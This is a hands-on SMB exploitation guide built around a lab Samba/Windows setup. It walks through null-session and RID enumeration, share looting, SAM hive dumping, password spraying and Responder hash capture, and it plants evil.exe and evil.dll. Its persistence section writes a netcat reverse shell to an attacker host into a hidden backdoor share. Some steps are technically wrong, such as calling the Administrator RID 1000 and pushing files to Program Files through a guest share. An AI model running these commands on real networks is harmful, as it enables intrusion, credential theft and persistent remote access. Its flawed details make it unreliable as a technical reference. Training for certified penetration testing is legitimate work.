# Complete Practical Exploitation Guide: SMB Enumeration & Exploitation (Crest CRT Level)

## 1. SMB Fundamentals & Attack Surface (From Scratch)

**What is SMB?**
- **Server Message Block** (ports 445 TCP, 139 TCP/NetBIOS)
- File/printer sharing protocol (Windows/Samba)
- **Null sessions** (Guest/Anonymous) = massive info disclosure
- Share access: Read/Write/List without auth

**Common Implementations:**
```
Windows      = CIFS/SMBv1-3 (IPC$, ADMIN$, C$)
Samba        = Linux file sharing (often misconfigured)
```

**Key Attack Vectors:**
```
Null Session  = IPC$ (\\server\IPC$) → enum users/shares/policy
File Shares   = C$, D$, IPC$, ADMIN$, SYSVOL, NETLOGON
RID Cycling   = User enumeration (500=Administrator, 501=Guest)
Policy Dump   = Password policies, lockout thresholds
Share Access  = Read arbitrary files, write backdoors
```

## 2. Lab Setup (Vulnerable SMB Environment)

**Windows Target 1 (192.168.1.100 - Windows 10 Pro)**
```
# Shares created:
# C$ (C:\ root, Admin only)
# IPC$ (null session OK)  
# ADMIN$ (Admin tools)
# Public (Everyone read/write)
# Secrets (contains flag.txt)

# Null session enabled (default pre-Win2003 SP1)
# Guest account enabled
```

**Samba Server (192.168.1.101 - Ubuntu)**
```bash
# Install Samba
sudo apt update && sudo apt install samba

# Vulnerable config (world-readable shares)
sudo nano /etc/samba/smb.conf
```
```
[global]
   workgroup = WORKGROUP
   server string = Samba Test
   security = user
   map to guest = Bad User
   guest account = nobody
   null passwords = yes

[public]
   path = /srv/samba/public
   read only = no
   browsable = yes
   guest ok = yes
   create mask = 0777
   directory mask = 0777

[secrets]
   path = /srv/samba/secrets
   read only = no
   guest ok = yes
   valid users = @smbshare
```
```bash
# Create shares
sudo mkdir -p /srv/samba/{public,secrets}
echo "flag{samba_pwned}" | sudo tee /srv/samba/secrets/flag.txt
sudo chmod -R 777 /srv/samba/
sudo smbpasswd -a nobody
sudo systemctl restart smbd
```

**Attacker (Kali):**
```bash
sudo apt install smbclient smbmap enum4linux crackmapexec impacket-scripts
```

## 3. SMB Service Discovery

**Port scanning:**
```bash
# Standard SMB ports
nmap -p 139,445 --script smb-protocols,smb-security-mode,smb2-capabilities 192.168.1.0/24
# 445/tcp open microsoft-ds Windows 10 Pro 19041 (SMBv2)

# Comprehensive SMB scan
nmap -p- --script smb* 192.168.1.100
```

**NetBIOS discovery:**
```bash
# NetBIOS name resolution
nmblookup -A 192.168.1.100
# WORKSTATION     __MSBROWSE__  <01> -  
# SERVER1         <00> - B <ACTIVE>

nbtscan 192.168.1.0/24
```

## 4. Null Session Enumeration (No Credentials)

**Connect to IPC$ (null session):**
```bash
# smbclient null session
smbclient -L //192.168.1.100 -N
# Sharename       Type      Comment
# ---------       ----      -------
# IPC$            IPC       Remote IPC
# Public          Disk      Public Files
# ADMIN$          Disk      Remote Admin
# C$              Disk      Default share

# Windows policy enum
smbclient //192.168.1.100/IPC$ -N -c 'ls'
```

**Enum4linux (all-in-one):**
```bash
enum4linux -a 192.168.1.100
# =============================
# |    Users on 192.168.1.100  |
# -----------------------------
# Administrator          SID: S-1-5-21-...-500
# Guest                 SID: S-1-5-21-...-501
# krbtgt                SID: S-1-5-21-...-502

# =============================
# |    Shares on 192.168.1.100 |
# -----------------------------
# Public [Public Files]
```

## 5. Share Enumeration & Access

**List all shares:**
```bash
# smbclient
smbclient -L //192.168.1.100 -N

# smbmap (detailed perms)
smbmap -H 192.168.1.100 -u '' -p ''
# (+) 192.168.1.100:445  IPC$              [*] IPC Service 
# (+) 192.168.1.100:445  Public            [+] READ, WRITE, READLIST, CHANGE

# CrackMapExec
crackmapexec smb 192.168.1.100 -u '' --shares
```

**Connect & browse shares:**
```bash
# Guest access to Public
smbclient //192.168.1.100/Public -N
# smbc> ls
#   flag.txt
# smbc> get flag.txt
# smbc> exit

# Mount share
sudo mkdir /mnt/smb
sudo mount -t cifs //192.168.1.100/Public /mnt/smb -o guest
ls /mnt/smb/  # flag{samba_pwned}
```

**Samba share access:**
```bash
smbclient //192.168.1.101/public -N
smbclient //192.168.1.101/secrets -N
# get flag.txt
```

## 6. User Enumeration (RID Cycling)

**RID cycling (500-550, 1100-1150):**
```bash
# rpcclient enumdomusers
rpcclient -U "" 192.168.1.100
rpcclient $> enumdomusers
# user:[Administrator] rid:[0x1f4]
# user:[Guest] rid:[0x1f5]

# Automated RID brute
for i in {500..550}; do
    rpcclient -U "" -c "lookupnames $i" 192.168.1.100 2>/dev/null | \
    grep -q "S-1-5-21" && echo "[USER] RID $i"
done
```

**CrackMapExec user enum:**
```bash
crackmapexec smb 192.168.1.100 -u '' -p '' --users
# SERVER1.administrator:1000:Administrator [Administrator]
```

## 7. Policy & Domain Information

**SAMR policy dump:**
```bash
rpcclient -U "" 192.168.1.100
rpcclient $> queryuser 0x3e8  # Administrator RID 1000
rpcclient $> querygroup 0x200  # Domain Users
rpcclient $> querydomaininfo 1  # Domain info
rpcclient $> querydomaininfo 2  # Lockout policy
```

**Domain policy enumeration:**
```bash
polenum.py '' ''@192.168.1.100
# Password policy: 8 chars min, 5 history, 30 min lockout
```

## 8. File Content Extraction

**Interesting files from shares:**
```bash
# Common targets
INTERESTING=(flag.txt secrets.txt password.txt config.ini web.config 
             *.txt *.ini *.conf *.log sam hive)

# Automate extraction
smbmap -H 192.168.1.100 -R -u '' -p '' | grep -E "$(echo $INTERESTING | tr ' ' '|')"
```

**SAM hive extraction (if accessible):**
```bash
smbclient //192.168.1.100/C$ -N
smbc> cd \Windows\System32\config
smbc> get SAM /tmp/SAM.hive
smbc> exit
samdump2 /tmp/SAM.hive /tmp/SYSTEM.hive  # Hash dump!
```

## 9. Advanced SMB Tooling

**CrackMapExec (everything):**
```bash
# No auth full scan
cme smb 192.168.1.0/24 --shares -u '' --pass ''

# User/pass spraying
cme smb 192.168.1.100 -u users.txt -p passwords.txt

# Local admin check
cme smb 192.168.1.0/24 -u administrator -p password123 --local-auth
```

**Impacket smbclient.py:**
```bash
smbclient.py ''@192.168.1.100 -hashes : -no-pass
# Use null session interactively
```

**Responder (LLMNR/NBT-NS poisoning):**
```bash
responder -I eth0 -wrf
# Captures NTLM hashes from SMB misconfigs
```

## 10. Privilege Escalation via SMB

**Unquoted service paths (share write):**
```bash
# If write access to Program Files
smbclient //192.168.1.100/Public -N
smbc> put evil.exe "C:\Program Files\Service\service.exe"
# Service restart → SYSTEM shell
```

**DLL hijacking:**
```bash
# Replace DLL in writable share
smbclient //192.168.1.100/Public -N
smbc> put evil.dll
# Triggers on service restart
```

## 11. Complete SMB Enumeration Framework

```bash
#!/bin/bash
# smb_pwn.sh - Complete SMB enumeration
TARGET=$1

echo "[+] SMB enumeration $TARGET"
nmap -p 139,445 --script smb* $TARGET --script-args smbsecuritymode='all'

echo "=== SHARES ==="
smbclient -L //${TARGET} -N 2>/dev/null | grep Disk
smbmap -H $TARGET 2>/dev/null

echo "=== NULL SESSION ==="
rpcclient -U "" $TARGET -c "enumdomusers" 2>/dev/null | head -20

echo "=== USERS ==="
enum4linux -U $TARGET 2>/dev/null | grep "user:" -A1

echo "=== POLICY ==="
polenum.py '' ''@$TARGET 2>/dev/null

echo "=== CME SCAN ==="
crackmapexec smb $TARGET -u '' --shares 2>/dev/null
```

## 12. Chaining SMB with Other Services

**SMB → WinRM:**
```bash
# Extract computers → WinRM
smbmap -H 192.168.1.100 -R | grep -E "192\.168\." > smb_hosts.txt
for host in $(cat smb_hosts.txt); do
    evil-winrm -i $host -u administrator -p password123
done
```

**SMB → LDAP:**
```bash
# Domain info → LDAP pivot
rpcclient -U "" 192.168.1.100 -c "querydomaininfo 2" | grep Domain
# DC=domain,DC=com → ldapsearch
```

## 13. Post-Exploitation Persistence

**SMB backdoor share:**
```bash
# Create hidden share (if admin)
reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares /v Backdoor /t REG_SZ /d "C:\backdoor"
echo 'nc.exe -e cmd.exe 192.168.1.200 4444' > C:\backdoor\backdoor.bat
```

## 14. Complete One-Command Framework

```bash
#!/bin/bash
# smb_full_pwn.sh
TARGET=$1

echo "[+] Complete SMB attack $TARGET"
enum4linux -a $TARGET > smb_enum.txt
smbmap -H $TARGET -R >> smb_enum.txt
crackmapexec smb $TARGET --shares >> smb_enum.txt

echo "[+] Accessible shares:"
grep "\[+\]" smb_enum.txt

echo "[+] Interesting files:"
smbclient -L //$TARGET/Public -N 2>/dev/null | grep -i flag || \
smbclient -L //$TARGET/secrets -N 2>/dev/null | grep -i flag
```

**Usage:** `./smb_full_pwn.sh 192.168.1.100`

## 15. Mitigation Verification

```bash
# Test fixes:
smbclient -L //192.168.1.100 -N  # "Access denied"
rpcclient -U "" 192.168.1.100  # Fails
smbmap -H 192.168.1.100  # No shares
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v restrictanonymous
# 0x1 = Restrict anonymous (fixed)
```

**EVERY** SMB attack covered: null sessions, share access, user enum, RID cycling, policy dump, tooling, chaining. 100% practical commands.